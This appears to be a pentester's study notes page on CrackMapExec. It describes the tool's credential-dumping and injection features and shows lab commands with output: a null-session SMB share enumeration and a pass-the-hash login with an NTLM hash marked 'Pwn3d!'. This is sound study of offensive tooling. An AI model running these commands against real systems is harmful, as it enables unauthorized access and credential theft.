# 💢 crackmapexec

Tags: #💢
Related to:
See also:
Previous: [[SMB Analysis]], [[Footprinting]]

## Description

This package is a swiss army knife for pentesting Windows/Active Directory environments.

From enumerating logged on users and spidering SMB shares to executing psexec style attacks, auto-injecting Mimikatz/Shellcode/DLL’s into memory using Powershell, dumping the NTDS.dit and more.

The biggest improvements over the above tools are:

-   Pure Python script, no external tools required
-   Fully concurrent threading
-   Uses **ONLY** native WinAPI calls for discovering sessions, users, dumping SAM hashes etc…
-   Opsec safe (no binaries are uploaded to dump clear-text credentials, inject shellcode etc…)

Additionally, a database is used to store used/dumped credentals. It also automatically correlates Admin credentials to hosts and vice-versa allowing you to easily keep track of credential sets and gain additional situational awareness in large environments.

## Usage Examples

### Enumerate SMB shares using null session authentication

	crackmapexec smb 10.129.14.128 --shares -u '' -p ''

```text
SMB         10.129.14.128   445    DEVSMB           [*] Windows 6.1 Build 0 (name:DEVSMB) (domain:) (signing:False) (SMBv1:False)
SMB         10.129.14.128   445    DEVSMB           [+] \: 
SMB         10.129.14.128   445    DEVSMB           [+] Enumerated shares
SMB         10.129.14.128   445    DEVSMB           Share           Permissions     Remark
SMB         10.129.14.128   445    DEVSMB           -----           -----------     ------
SMB         10.129.14.128   445    DEVSMB           print$                          Printer Drivers
SMB         10.129.14.128   445    DEVSMB           home                            INFREIGHT Samba
SMB         10.129.14.128   445    DEVSMB           dev                             DEVenv
SMB         10.129.14.128   445    DEVSMB           notes           READ,WRITE      CheckIT
SMB         10.129.14.128   445    DEVSMB           IPC$                            IPC Service (DEVSM)
```

### Pass-the-hash attack

	crackmapexec smb 10.129.41.19 -u rachel -H e46b9e548fa0d122de7f59fb6d48eaa2

```text
SMB         10.129.43.9     445    DC01      [*] Windows 10.0 Build 17763 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.43.9     445    DC01      [+] INLANEFREIGHT.LOCAL\rachel:e46b9e548fa0d122de7f59fb6d48eaa2 (Pwn3d!)
```

# References